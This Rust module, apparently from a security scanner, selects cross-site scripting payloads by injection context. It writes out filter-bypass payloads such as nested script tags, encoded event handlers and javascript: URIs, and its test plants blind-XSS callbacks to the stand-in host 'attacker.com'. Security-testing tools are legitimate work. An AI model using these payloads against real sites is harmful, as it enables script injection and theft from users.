// Context-Aware Payload Selection Module
// Intelligently selects payloads based on detected context and encoding

use crate::xss::context::{XssContext, QuoteType};
use std::fs;
use std::path::Path;

#[derive(Debug, Clone)]
pub struct XssPayload {
    pub value: String,
    pub technique: String,
    pub context: XssContext,
}

#[derive(Debug, Clone)]
pub struct PayloadSet {
    pub payloads: Vec<XssPayload>,
    pub context: XssContext,
}

impl PayloadSet {
    pub fn new(context: XssContext) -> Self {
        Self {
            payloads: Vec::new(),
            context,
        }
    }
    
    pub fn add(&mut self, payload: XssPayload) {
        self.payloads.push(payload);
    }
    
    pub fn len(&mut self) -> usize {
        self.payloads.len()
    }
    
    pub fn is_empty(&self) -> bool {
        self.payloads.is_empty()
    }
}

/// Main entry point: Load context-appropriate payloads
pub fn load_payloads_for_context(ctx: &XssContext) -> anyhow::Result<PayloadSet> {
    let file_path = match ctx {
        XssContext::HtmlText => "payloads/xss/html.txt",
        XssContext::HtmlAttribute { .. } => "payloads/xss/attribute.txt",
        XssContext::JavaScriptString { .. } => "payloads/xss/js_string.txt",
        XssContext::JavaScriptCode => "payloads/xss/js_code.txt",
        XssContext::Url { .. } => "payloads/xss/url.txt",
        XssContext::Unknown => "payloads/xss/polyglot.txt", // Use polyglots for unknown contexts
        _ => return Ok(PayloadSet::new(ctx.clone())),
    };
    
    let mut payload_set = PayloadSet::new(ctx.clone());
    let raw_payloads = read_payload_file(file_path)?;
    
    for payload_str in raw_payloads {
        payload_set.add(XssPayload {
            value: payload_str.clone(),
            technique: classify_technique(&payload_str),
            context: ctx.clone(),
        });
    }
    
    Ok(payload_set)
}

/// Load polyglot payloads (work across multiple contexts)
pub fn load_polyglot_payloads() -> anyhow::Result<PayloadSet> {
    let mut payload_set = PayloadSet::new(XssContext::Unknown);
    let raw_payloads = read_payload_file("payloads/xss/polyglot.txt")?;
    
    for payload_str in raw_payloads {
        payload_set.add(XssPayload {
            value: payload_str.clone(),
            technique: "Polyglot".to_string(),
            context: XssContext::Unknown,
        });
    }
    
    Ok(payload_set)
}

/// Load blind XSS payloads with callback substitution
pub fn load_blind_payloads(callback_domain: &str) -> anyhow::Result<PayloadSet> {
    let mut payload_set = PayloadSet::new(XssContext::Unknown);
    let raw_payloads = read_payload_file("payloads/xss/blind.txt")?;
    
    for payload_str in raw_payloads {
        // Replace {{CALLBACK}} placeholder with actual callback domain
        let substituted = payload_str.replace("{{CALLBACK}}", callback_domain);
        
        payload_set.add(XssPayload {
            value: substituted,
            technique: "Blind XSS".to_string(),
            context: XssContext::Unknown,
        });
    }
    
    Ok(payload_set)
}

/// Generate context-specific bypass payloads based on detected encoding/filtering
pub fn generate_bypass_payloads(
    base_context: &XssContext,
    encoding_detected: bool,
    filters_detected: &[String],
) -> Vec<XssPayload> {
    let mut bypasses = Vec::new();
    
    if encoding_detected {
        // Try double encoding bypasses
        bypasses.extend(generate_encoding_bypasses(base_context));
    }
    
    for filter in filters_detected {
        if filter.contains("script") {
            bypasses.extend(generate_script_keyword_bypasses(base_context));
        }
        if filter.contains("javascript:") {
            bypasses.extend(generate_protocol_bypasses(base_context));
        }
        if filter.contains("Case transformation") {
            bypasses.extend(generate_case_bypasses(base_context));
        }
    }
    
    bypasses
}

fn generate_encoding_bypasses(ctx: &XssContext) -> Vec<XssPayload> {
    let mut payloads = Vec::new();
    
    match ctx {
        XssContext::HtmlText => {
            // Unicode and hex encoded payloads
            payloads.push(XssPayload {
                value: r#"<svg/onload=alert(1)>"#.to_string(),
                technique: "SVG Encoding Bypass".to_string(),
                context: ctx.clone(),
            });
            payloads.push(XssPayload {
                value: r#"<img src=x onerror=\u0061lert(1)>"#.to_string(),
                technique: "Unicode Bypass".to_string(),
                context: ctx.clone(),
            });
        }
        XssContext::HtmlAttribute { quote_type, .. } => {
            match quote_type {
                QuoteType::Double => {
                    payloads.push(XssPayload {
                        value: r#"&#34; onload=alert(1) x=&#34;"#.to_string(),
                        technique: "HTML Entity Bypass".to_string(),
                        context: ctx.clone(),
                    });
                }
                QuoteType::Single => {
                    payloads.push(XssPayload {
                        value: r#"&#39; onload=alert(1) x=&#39;"#.to_string(),
                        technique: "HTML Entity Bypass".to_string(),
                        context: ctx.clone(),
                    });
                }
                _ => {}
            }
        }
        XssContext::JavaScriptString { .. } => {
            payloads.push(XssPayload {
                value: r#"\u0027;alert(1);//"#.to_string(),
                technique: "Unicode Escape Bypass".to_string(),
                context: ctx.clone(),
            });
            payloads.push(XssPayload {
                value: r#"\x27;alert(1);//"#.to_string(),
                technique: "Hex Escape Bypass".to_string(),
                context: ctx.clone(),
            });
        }
        _ => {}
    }
    
    payloads
}

fn generate_script_keyword_bypasses(ctx: &XssContext) -> Vec<XssPayload> {
    vec![
        XssPayload {
            value: "<scr<script>ipt>alert(1)</scr</script>ipt>".to_string(),
            technique: "Nested Tag Bypass".to_string(),
            context: ctx.clone(),
        },
        XssPayload {
            value: "<ScRiPt>alert(1)</ScRiPt>".to_string(),
            technique: "Case Variation Bypass".to_string(),
            context: ctx.clone(),
        },
        XssPayload {
            value: "<svg onload=alert(1)>".to_string(),
            technique: "Alternative Tag Bypass".to_string(),
            context: ctx.clone(),
        },
        XssPayload {
            value: "<img src=x onerror=alert(1)>".to_string(),
            technique: "Event Handler Bypass".to_string(),
            context: ctx.clone(),
        },
    ]
}

fn generate_protocol_bypasses(ctx: &XssContext) -> Vec<XssPayload> {
    vec![
        XssPayload {
            value: "javascript:alert(1)".to_string(),
            technique: "Direct Protocol".to_string(),
            context: ctx.clone(),
        },
        XssPayload {
            value: "javascript:%61lert(1)".to_string(),
            technique: "URL Encoded Protocol".to_string(),
            context: ctx.clone(),
        },
        XssPayload {
            value: "java%09script:alert(1)".to_string(),
            technique: "Tab Character Bypass".to_string(),
            context: ctx.clone(),
        },
        XssPayload {
            value: "&#106;avascript:alert(1)".to_string(),
            technique: "HTML Entity Protocol".to_string(),
            context: ctx.clone(),
        },
        XssPayload {
            value: "data:text/html,<script>alert(1)</script>".to_string(),
            technique: "Data URI".to_string(),
            context: ctx.clone(),
        },
    ]
}

fn generate_case_bypasses(ctx: &XssContext) -> Vec<XssPayload> {
    vec![
        XssPayload {
            value: "<ScRiPt>alert(1)</ScRiPt>".to_string(),
            technique: "Mixed Case".to_string(),
            context: ctx.clone(),
        },
        XssPayload {
            value: "<SCRIPT>alert(1)</SCRIPT>".to_string(),
            technique: "Uppercase".to_string(),
            context: ctx.clone(),
        },
        XssPayload {
            value: "<SvG OnLoAd=alert(1)>".to_string(),
            technique: "Mixed Case SVG".to_string(),
            context: ctx.clone(),
        },
    ]
}

/// Select the most promising payloads based on context analysis
pub fn prioritize_payloads(mut payload_set: PayloadSet, max_count: usize) -> Vec<XssPayload> {
    // Shuffle for variety, then take top N
    // In production, this would use more sophisticated scoring
    
    if payload_set.payloads.len() <= max_count {
        return payload_set.payloads;
    }
    
    // Take a diverse sample
    let step = payload_set.payloads.len() / max_count;
    payload_set.payloads
        .into_iter()
        .step_by(step.max(1))
        .take(max_count)
        .collect()
}

fn read_payload_file<P: AsRef<Path>>(path: P) -> anyhow::Result<Vec<String>> {
    let content = fs::read_to_string(path)?;
    let payloads = content
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .map(String::from)
        .collect();
    
    Ok(payloads)
}

fn classify_technique(payload: &str) -> String {
    if payload.contains("<script>") {
        "Script Tag".to_string()
    } else if payload.contains("<svg") {
        "SVG Event".to_string()
    } else if payload.contains("<img") {
        "IMG Event".to_string()
    } else if payload.contains("javascript:") {
        "JavaScript Protocol".to_string()
    } else if payload.contains("data:") {
        "Data URI".to_string()
    } else if payload.contains("onload=") || payload.contains("onerror=") {
        "Event Handler".to_string()
    } else if payload.contains("</script>") {
        "Script Breakout".to_string()
    } else if payload.contains("';") || payload.contains("\";") {
        "String Breakout".to_string()
    } else if payload.contains("fetch(") || payload.contains("new Image()") {
        "Data Exfiltration".to_string()
    } else {
        "Generic".to_string()
    }
}

/// Load detection markers for reflection discovery
pub fn load_markers() -> anyhow::Result<Vec<String>> {
    read_payload_file("payloads/xss/markers.txt")
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_technique_classification() {
        assert_eq!(classify_technique("<script>alert(1)</script>"), "Script Tag");
        assert_eq!(classify_technique("<svg onload=alert(1)>"), "SVG Event");
        assert_eq!(classify_technique("';alert(1);//"), "String Breakout");
    }
    
    #[test]
    fn test_bypass_generation() {
        let bypasses = generate_script_keyword_bypasses(&XssContext::HtmlText);
        assert!(!bypasses.is_empty());
        assert!(bypasses.iter().any(|p| p.value.contains("<svg")));
    }
    
    #[test]
    fn test_blind_payload_substitution() {
        let result = load_blind_payloads("attacker.com");
        assert!(result.is_ok());
        let payload_set = result.unwrap();
        assert!(!payload_set.payloads.is_empty());
        assert!(payload_set.payloads.iter().any(|p| p.value.contains("attacker.com")));
    }
}
